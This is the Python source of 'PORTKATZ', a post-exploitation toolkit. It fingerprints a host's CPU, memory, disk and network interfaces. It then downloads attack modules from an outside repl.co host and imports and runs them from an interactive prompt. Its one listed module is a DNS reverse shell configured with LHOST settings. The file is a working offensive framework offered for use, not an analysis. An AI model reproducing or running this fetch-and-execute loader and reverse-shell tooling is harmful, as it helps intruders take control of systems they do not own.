#! /usr/bin/python3

# PORTKATZ - Post-/Exploitation Toolkit


# IMPORTZ
import socket
import requests
import Crypto
import hashlib
import platform
import re
import psutil
import subprocess
import argparse
from tqdm import tqdm
import os
import time
import sys
# IMPORTZ


# PORTKATZ MODULEZ
modulelist = {'dns_reverseshell': 'https://fr4gment.repl.co'}



def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)
    def show(j):
        x = int(size*j/count)
        file.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "."*(size-x), j, count))
        file.flush()        
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    file.write("\n")
    file.flush()


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def __get_nbits():
    abits = platform.architecture()[0]
    nbits = re.compile('(\d+)bit').search(abits).group(1)
    return nbits

def is_core(cores):
    if cores == 2:
        return 'Dual'
    elif cores == 4:
        return 'Quad'
    else:
        return 'Unknown'

def get_model_name_cpu():
    command = "cat /proc/cpuinfo"
    all_info = subprocess.getoutput(command).strip()
    for line in all_info.split("\n"):
        if "model name" in line:
            return re.sub( ".*model name.*:", "", line,1)

def get_print_hardware_specs():
    bit = __get_nbits()
    cores = psutil.cpu_count(logical=True)
    cores = is_core(cores)
    model = get_model_name_cpu()

    svmem = psutil.virtual_memory()
    totalr = get_size(svmem.total)
    used = get_size(svmem.used)
    available = get_size(svmem.available)

    partitions = psutil.disk_partitions()
    partition = partitions[0]
    partition_usage = psutil.disk_usage(partition.mountpoint)
    totald = get_size(partition_usage.total)
    usedd = get_size(partition_usage.used)
    availabled = get_size(partition_usage.free)

    print('[*] Hardware Specs:')
    print('\tCPU: %s Core, %s-bit%s' % (cores, bit, model))
    print('\tRAM: %s Total, Used: %s, Available: %s' % (totalr, used, available))
    print('\tDISK: %s Total, Used: %s, Available: %s' % (totald, usedd, availabled))


def get_print_net_info():
    print('[*] Network Interfaces:')
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addrs in if_addrs.items():
        for addr in interface_addrs:
            print('\t%s, ip/mac: %s, mask: %s, broadcastip/mac: %s' % (interface_name, addr.address, addr.netmask, addr.broadcast))
            
def load_modules():
    if not os.path.isdir(os.getcwd() + '/pkbin'):
        os.mkdir('./pkbin')
        for modulename, moduleaddr in progressbar(modulelist.items(), '[*] Grabbing Modules...', 40):
            r = requests.get(moduleaddr)
            with open('./pkbin/' + modulename + '.py', 'wb') as o:
                o.write(r.content)
    else:
        notdownloaded = []
        for modulename, moduleaddr in progressbar(modulelist.items(), '[*] Checking Modules...', 40):
            if not os.path.isfile('./pkbin/' + modulename + '.py'):
                notdownloaded += [modulename]

        if notdownloaded:
            for module in progressbar(notdownloaded, '[*] Grabbing Modules...', 40):
                r = requests.get(modulelist[module])
                with open('./pkbin/' + module + '.py', 'wb') as o:
                    o.write(r.content)

            



def InvokePortkatz(args):
    hostname = socket.gethostname()

    if not args.quiet:
        print('-'*40)
        print('portkatz v1.0 L3TH4L')
        get_print_hardware_specs()
        get_print_net_info()
        print('-'*40)
    load_modules()
    prompt = 'portkatz (python) > '
    module = ''
    while True:
        task = input(prompt)
        if not task:
            continue
        tokens = task.split(' ')
        if tokens[0] == 'exit':
            print('[*] Cleaning Up...')
            # Do House-Keeping Here... Hmmmmm.
            quit()
        elif tokens[0] == 'help':
            help = '''
exit                    |   exit portkatz
help                    |   show help (this message)
use <module>            |   use a module (eg. use dns_reverseshell)
params                  |   view parameters for a module (eg. params)
set <param> <value>     |   set a parameter (eg. set LHOST 192.168.10.29)
run                     |   run a module
            '''
            print(help)
        elif tokens[0] == 'params':
            if module == '':
                print('No Paramaters...')
            else:
                print(module.params())
        elif tokens[0] == 'use':
            if len(tokens) == 2:
                try:
                    module = __import__('pkbin.' + tokens[1], fromlist=['Module'])
                    module = module.Module()
                    prompt = 'portkatz (python/%s) > ' % tokens[1]
                except ModuleNotFoundError:
                    print('[-] Module ' + tokens[1] + ' does not exist')
        elif tokens[0] == 'set':
            if len(tokens) == 3:
                if module == '':
                    print('Cannot Set a Paramater for a non-module')
                else:
                    module.set(tokens[1], tokens[2])
                    print(tokens[1] + ' => ' + tokens[2])

        elif tokens[0] == 'run':
            if module == '':
                print('[-] Failed to Run, No Module Chosen...')
            else:
                err = module.run()
                if err != None:
                    print(err)
                    continue
                else:
                    module = ''
                    prompt = 'portkatz (python) > '

    

# MEZ LOGO
logo = '''
   ▐▀▄       ▄▀▌   ▄▄▄▄▄▄▄
   ▌▒▒▀▄▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄
  ▐▒▒▒▒▀▒▀▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▀▄
▀█▒▒▒█▌▒▒█▒▒▐█▒▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌
▀▌▒▒▒▒▒▒▀▒▀▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐   ▄▄
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
▐▒▒▒▒▒▒▒▒▒▒▒▒PORTKATZ▒▒▒▒▒▒▒▒▒▒▒▒▒█▒█▀
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▀
▐▒▒▒▒▒▒▒▒CAN I HAZ SHELL?▒▒▒▒▒▒▒▒▒▌
 ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐
 ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌
  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐
  ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌
    ▀▄▄▀▀▀▀▀▄▄▀▀▀▀▀▀▀▄▄▀▀▀▀▀▄▄▀
'''


# ME HAZ MAIN FUNCTIONZ
if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-q', '--quiet', action='store_true', dest='quiet', help='launch PortKatz in quiet mode')

    args = parser.parse_args()

    if not args.quiet:
        print(logo)
    InvokePortkatz(args)